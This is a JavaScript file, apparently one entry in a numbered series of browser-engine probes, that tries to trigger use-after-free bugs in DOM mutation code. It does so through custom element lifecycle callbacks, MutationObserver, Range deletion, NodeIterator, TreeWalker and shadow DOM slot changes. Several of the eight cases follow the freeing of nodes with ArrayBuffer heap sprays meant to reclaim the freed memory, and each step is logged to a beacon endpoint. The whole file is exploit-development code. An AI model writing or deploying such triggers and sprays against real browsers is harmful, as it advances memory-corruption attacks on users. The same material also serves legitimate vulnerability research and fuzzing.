// p227 — Custom Element callback UAF battery
//
// Custom element lifecycle callbacks (connectedCallback, disconnectedCallback,
// adoptedCallback, attributeChangedCallback) run SYNCHRONOUSLY during DOM
// mutations. If C++ code holds raw pointers to siblings/children across these
// callbacks, the JS callback can free those nodes → dangling pointer.
//
// Target: ContainerNode::appendChild/removeChild/replaceChild/insertBefore
// internal iteration with raw Node* across custom element reactions.
//
// FastMalloc-allocated DOM nodes → ArrayBuffer spray can reclaim directly.
//
// Beacon prefix: V227-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V227-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V227-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  BS('BOOT');

  // ---- TEST A: connectedCallback removes siblings during insertBefore ----
  // insertBefore(newChild, refChild) — if newChild's connectedCallback
  // removes refChild, the C++ code might hold a stale pointer to refChild.
  try {
    BS('A-START');
    var containerA = document.createElement('div');
    document.body.appendChild(containerA);

    var refChild = document.createElement('div');
    refChild.id = 'refA';
    containerA.appendChild(refChild);

    // Add several siblings for spray target
    for (var i = 0; i < 10; i++) {
      var sib = document.createElement('div');
      sib.textContent = 'sib' + i;
      containerA.appendChild(sib);
    }
    document.body.offsetHeight;

    var removedInCallback = false;
    customElements.define('test-a-elem', class extends HTMLElement {
      connectedCallback() {
        if (!removedInCallback && refChild.parentNode) {
          removedInCallback = true;
          BS('A-CB-REMOVING-REF');
          // Remove refChild while insertBefore holds a pointer to it
          containerA.removeChild(refChild);
          // Force layout to trigger any stale pointer usage
          document.body.offsetHeight;
        }
      }
    });

    var customA = document.createElement('test-a-elem');
    BS('A-INSERT');
    // insertBefore with refChild — connectedCallback fires, removes refChild
    try {
      containerA.insertBefore(customA, refChild);
      BS('A-SURVIVED');
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 40));
    }
    document.body.removeChild(containerA);
  } catch (e) {
    BS('A-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST B: disconnectedCallback during replaceChild ----
  // replaceChild(newChild, oldChild) removes oldChild, inserts newChild.
  // If oldChild's disconnectedCallback modifies the parent's children...
  try {
    BS('B-START');
    var containerB = document.createElement('div');
    document.body.appendChild(containerB);

    var children_b = [];
    for (var i = 0; i < 8; i++) {
      var ch = document.createElement('div');
      ch.id = 'b' + i;
      containerB.appendChild(ch);
      children_b.push(ch);
    }

    customElements.define('test-b-old', class extends HTMLElement {
      disconnectedCallback() {
        BS('B-DISCONN-CB');
        // Remove all remaining children while replaceChild is in progress
        while (containerB.firstChild) {
          containerB.removeChild(containerB.firstChild);
        }
        BS('B-CLEARED');
        // Spray to reclaim freed Node memory
        var spray = [];
        for (var s = 0; s < 500; s++) {
          var ab = new ArrayBuffer(256);
          var v = new Uint32Array(ab);
          for (var k = 0; k < v.length; k++) v[k] = 0xDEAD0000 | k;
          spray.push(ab);
        }
        BS('B-SPRAYED');
        document.body.offsetHeight;
      }
    });

    // Upgrade one child to custom element
    var oldChild = document.createElement('test-b-old');
    containerB.appendChild(oldChild);
    document.body.offsetHeight;

    var newChild = document.createElement('div');
    newChild.textContent = 'replacement';
    BS('B-REPLACE');
    try {
      containerB.replaceChild(newChild, oldChild);
      BS('B-SURVIVED');
    } catch (e) {
      BS('B-ERR-' + e.message.substring(0, 40));
    }
    if (containerB.parentNode) document.body.removeChild(containerB);
  } catch (e) {
    BS('B-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST C: adoptedCallback + connectedCallback chain ----
  // Moving a custom element between documents triggers adoptedCallback
  // then connectedCallback. During these callbacks, modify the source doc.
  try {
    BS('C-START');
    var iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    var iframeDoc = iframe.contentDocument;

    customElements.define('test-c-adopt', class extends HTMLElement {
      adoptedCallback(oldDoc, newDoc) {
        BS('C-ADOPTED');
        // During adoption, destroy elements in old document
        if (oldDoc.body) {
          while (oldDoc.body.firstChild) {
            oldDoc.body.removeChild(oldDoc.body.firstChild);
          }
        }
        BS('C-OLD-CLEARED');
      }
      connectedCallback() {
        BS('C-CONNECTED');
      }
    });

    // Create elements in iframe
    var iframeChildren = [];
    for (var i = 0; i < 15; i++) {
      var el = iframeDoc.createElement('div');
      el.textContent = 'iframe-child-' + i;
      iframeDoc.body.appendChild(el);
      iframeChildren.push(el);
    }

    var customC = iframeDoc.createElement('test-c-adopt');
    customC.textContent = 'adoptable';
    iframeDoc.body.appendChild(customC);
    iframeDoc.body.offsetHeight;

    // Adopt into main document — triggers adoptedCallback + connectedCallback
    BS('C-ADOPTING');
    try {
      document.body.appendChild(document.adoptNode(customC));
      BS('C-SURVIVED');
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 40));
    }
    document.body.removeChild(iframe);
  } catch (e) {
    BS('C-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST D: MutationObserver + custom element + Range ----
  // Create a Range spanning multiple nodes. Delete contents while
  // a MutationObserver callback moves nodes around.
  try {
    BS('D-START');
    var containerD = document.createElement('div');
    document.body.appendChild(containerD);

    for (var i = 0; i < 20; i++) {
      var el = document.createElement('span');
      el.textContent = 'node' + i + ' ';
      containerD.appendChild(el);
    }
    document.body.offsetHeight;

    var range = document.createRange();
    range.setStart(containerD.childNodes[3], 0);
    range.setEnd(containerD.childNodes[17], 0);

    var moFired = false;
    var mo = new MutationObserver(function(mutations) {
      if (moFired) return;
      moFired = true;
      BS('D-MO-FIRE');
      // During MO callback, remove additional nodes
      for (var i = containerD.childNodes.length - 1; i >= 0; i--) {
        if (containerD.childNodes[i]) {
          try { containerD.removeChild(containerD.childNodes[i]); } catch (e) {}
        }
      }
      BS('D-MO-CLEARED');
      // Spray
      var spray = [];
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(128);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) v[k] = 0xBEEF0000 | k;
        spray.push(ab);
      }
      BS('D-MO-SPRAYED');
    });
    mo.observe(containerD, { childList: true, subtree: true });

    BS('D-DELETE');
    try {
      range.deleteContents();
      BS('D-SURVIVED');
    } catch (e) {
      BS('D-ERR-' + e.message.substring(0, 40));
    }
    mo.disconnect();
    if (containerD.parentNode) document.body.removeChild(containerD);
  } catch (e) {
    BS('D-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST E: NodeIterator + custom element removal ----
  // NodeIterator traverses the DOM tree. During traversal, if a custom
  // element's disconnectedCallback fires and modifies the tree...
  try {
    BS('E-START');
    var containerE = document.createElement('div');
    document.body.appendChild(containerE);

    var ePhase = 0;
    customElements.define('test-e-iter', class extends HTMLElement {
      disconnectedCallback() {
        ePhase++;
        if (ePhase <= 3) {
          BS('E-DISCONN-' + ePhase);
          // Remove siblings during NodeIterator traversal
          var parent = containerE;
          if (parent.childNodes.length > 2) {
            parent.removeChild(parent.childNodes[1]);
          }
        }
      }
    });

    // Mix regular and custom elements
    for (var i = 0; i < 12; i++) {
      var el;
      if (i % 3 === 0) {
        el = document.createElement('test-e-iter');
      } else {
        el = document.createElement('div');
      }
      el.textContent = 'iter-' + i;
      containerE.appendChild(el);
    }
    document.body.offsetHeight;

    var iter = document.createNodeIterator(containerE, NodeFilter.SHOW_ELEMENT);
    var nodes = [];
    BS('E-ITERATING');
    try {
      var node;
      while (node = iter.nextNode()) {
        nodes.push(node);
        // Remove custom elements as we find them
        if (node.tagName && node.tagName.startsWith('TEST-E')) {
          if (node.parentNode) node.parentNode.removeChild(node);
        }
      }
      BS('E-ITERATED-' + nodes.length);
      BS('E-SURVIVED');
    } catch (e) {
      BS('E-ERR-' + e.message.substring(0, 40));
    }
    if (containerE.parentNode) document.body.removeChild(containerE);
  } catch (e) {
    BS('E-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST F: innerHTML during connectedCallback ----
  // Setting innerHTML destroys all children then parses new ones.
  // If connectedCallback sets innerHTML on the parent...
  try {
    BS('F-START');
    var containerF = document.createElement('div');
    document.body.appendChild(containerF);

    // Add existing children
    for (var i = 0; i < 10; i++) {
      var el = document.createElement('div');
      el.id = 'f-child-' + i;
      el.style.cssText = 'position:relative;width:10px;height:10px;';
      containerF.appendChild(el);
    }
    document.body.offsetHeight;

    var fTriggered = false;
    customElements.define('test-f-inner', class extends HTMLElement {
      connectedCallback() {
        if (!fTriggered) {
          fTriggered = true;
          BS('F-CB-INNERHTML');
          // Nuke parent's children via innerHTML
          containerF.innerHTML = '<div id="replaced">replaced</div>';
          BS('F-CB-REPLACED');
          // Force layout
          document.body.offsetHeight;
          // Spray
          var spray = [];
          for (var s = 0; s < 500; s++) {
            var ab = new ArrayBuffer(192);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k++) v[k] = 0xCAFE0000 | k;
            spray.push(ab);
          }
          BS('F-CB-SPRAYED');
        }
      }
    });

    var customF = document.createElement('test-f-inner');
    BS('F-APPEND');
    try {
      containerF.appendChild(customF);
      BS('F-SURVIVED');
    } catch (e) {
      BS('F-ERR-' + e.message.substring(0, 40));
    }
    document.body.offsetHeight;
    if (containerF.parentNode) document.body.removeChild(containerF);
  } catch (e) {
    BS('F-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST G: Shadow DOM slot reassignment during mutation ----
  // Slotted content is redistributed when slot names change.
  // If during slot change processing, a MutationObserver modifies
  // the shadow host's children...
  try {
    BS('G-START');
    var hostG = document.createElement('div');
    document.body.appendChild(hostG);

    var shadowG = hostG.attachShadow({ mode: 'open' });
    var slot1 = document.createElement('slot');
    slot1.name = 'slot1';
    shadowG.appendChild(slot1);
    var slot2 = document.createElement('slot');
    slot2.name = 'slot2';
    shadowG.appendChild(slot2);

    // Add slottable children
    var slottedChildren = [];
    for (var i = 0; i < 8; i++) {
      var el = document.createElement('div');
      el.slot = 'slot1';
      el.textContent = 'slotted-' + i;
      hostG.appendChild(el);
      slottedChildren.push(el);
    }
    document.body.offsetHeight;
    BS('G-SETUP');

    // Observe slot changes
    slot1.addEventListener('slotchange', function() {
      BS('G-SLOTCHANGE');
      // During slot change, remove children and change their slot assignment
      for (var i = slottedChildren.length - 1; i >= 4; i--) {
        if (slottedChildren[i].parentNode) {
          hostG.removeChild(slottedChildren[i]);
        }
      }
      // Spray
      var spray = [];
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(160);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) v[k] = 0xFACE0000 | k;
        spray.push(ab);
      }
      BS('G-SPRAYED');
    });

    // Trigger slot reassignment by changing slot names
    BS('G-REASSIGN');
    for (var i = 0; i < 4; i++) {
      slottedChildren[i].slot = 'slot2';
    }
    document.body.offsetHeight;
    BS('G-SURVIVED');

    if (hostG.parentNode) document.body.removeChild(hostG);
  } catch (e) {
    BS('G-OUTER-' + e.message.substring(0, 40));
  }

  // ---- TEST H: document.createTreeWalker during mutation ----
  // TreeWalker holds reference to root and current node.
  // If during traversal, the tree structure changes via custom element...
  try {
    BS('H-START');
    var containerH = document.createElement('div');
    document.body.appendChild(containerH);

    var hPhase = 0;
    customElements.define('test-h-walk', class extends HTMLElement {
      connectedCallback() {
        hPhase++;
        if (hPhase === 2) {
          BS('H-CB-REPARENT');
          // Move containerH's children to a DocumentFragment (disconnects them)
          var frag = document.createDocumentFragment();
          while (containerH.childNodes.length > 1) {
            frag.appendChild(containerH.firstChild);
          }
          BS('H-CB-MOVED-' + frag.childNodes.length);
          // Spray
          var spray = [];
          for (var s = 0; s < 200; s++) {
            var ab = new ArrayBuffer(128);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k++) v[k] = 0xAAAA0000 | k;
            spray.push(ab);
          }
        }
      }
    });

    // Build tree
    for (var i = 0; i < 8; i++) {
      var el = document.createElement('div');
      el.textContent = 'walk-' + i;
      containerH.appendChild(el);
    }

    // Add custom element to trigger callback during walk
    var trigger1 = document.createElement('test-h-walk');
    trigger1.textContent = 'trigger1';
    containerH.appendChild(trigger1);
    document.body.offsetHeight;

    var walker = document.createTreeWalker(containerH, NodeFilter.SHOW_ELEMENT);
    BS('H-WALKING');
    var wNodes = [];
    try {
      var wn;
      while (wn = walker.nextNode()) {
        wNodes.push(wn.textContent);
      }
      BS('H-WALKED-' + wNodes.length);
    } catch (e) {
      BS('H-WALK-ERR-' + e.message.substring(0, 40));
    }

    // Now add a second custom element to trigger the reparent
    var trigger2 = document.createElement('test-h-walk');
    trigger2.textContent = 'trigger2';
    containerH.appendChild(trigger2);
    document.body.offsetHeight;

    // Try to continue the walker after tree mutation
    try {
      walker.currentNode = containerH;
      var wn2;
      while (wn2 = walker.nextNode()) {
        wNodes.push(wn2.textContent);
      }
      BS('H-REWALK-' + wNodes.length);
      BS('H-SURVIVED');
    } catch (e) {
      BS('H-REWALK-ERR-' + e.message.substring(0, 40));
    }
    if (containerH.parentNode) document.body.removeChild(containerH);
  } catch (e) {
    BS('H-OUTER-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
